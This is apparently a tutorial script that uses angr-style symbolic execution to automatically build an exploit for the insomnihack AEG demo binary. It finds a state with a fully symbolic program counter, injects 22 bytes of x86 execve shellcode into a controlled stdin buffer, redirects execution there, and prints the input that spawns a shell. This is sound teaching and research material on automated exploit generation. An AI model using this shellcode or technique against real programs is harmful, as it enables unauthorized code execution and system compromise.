```
load 'repo/angr_examples/examples/insomnihack_aeg/demo_bin'
keep_unconstrained

set_entry_state add_options=['REVERSE_MEMORY_NAME_MAP', 'TRACK_ACTION_HISTORY']


def fully_symbolic(state):
    fully_sym = True
    for s in (chop_symbol &reg.pc):
        if (is_symbolic s):
            print ""
        else:
            fully_sym = False
    
    return fully_sym
            

exploitable_state_index = -1
while exploitable_state_index < 0:
    step
    unconst = len (list_states unconstrained)
    for i in range(unconst):
        print "Checking the unconstrained states to see if they give control over the pc.\nStates to check:  "
        println (len (list_states unconstrained))
        select_state i unconstrained
        if fully_symbolic &state:
            println "Vulnerable state found, continue to exploit..."
            exploitable_state_index = i
            break
        else:
            move_state_to_stash i 'unconstrained' 'pruned'
```

# Exploiting the vulnerability


```
def check_payload_fit(addr, addresses, length):
    result = True
    for i in range(length):
        to_test = addr + i
        if to_test in addresses:
            result = True
        else:
            result = False
            break
    return result
        


def get_controled_buffer_addr(shellcode_length):
    buffer_name = ""
    for var in get_stdin_variables:
        for n in &vars.var[0].variables:
            buffer_name = n

    target_address = -1
    buffer_addresses = get_addr_for_name buffer_name
    for addr in buffer_addresses:
        if check_payload_fit addr buffer_addresses shellcode_length:
            target_address = addr
            break
    return target_address
    
        
shell_code = 0x6a68682f2f2f73682f62696e89e331c96a0b5899cd80

control_buffer_addr = get_controled_buffer_addr 22


add_constraint &mem[control_buffer_addr->22] == shell_code
add_constraint &reg.pc == control_buffer_addr

to_hex (dump_stdstream stdin)

print "Required input to spawn a /bin/bash shell: "
println (dump_stdstream stdin)
```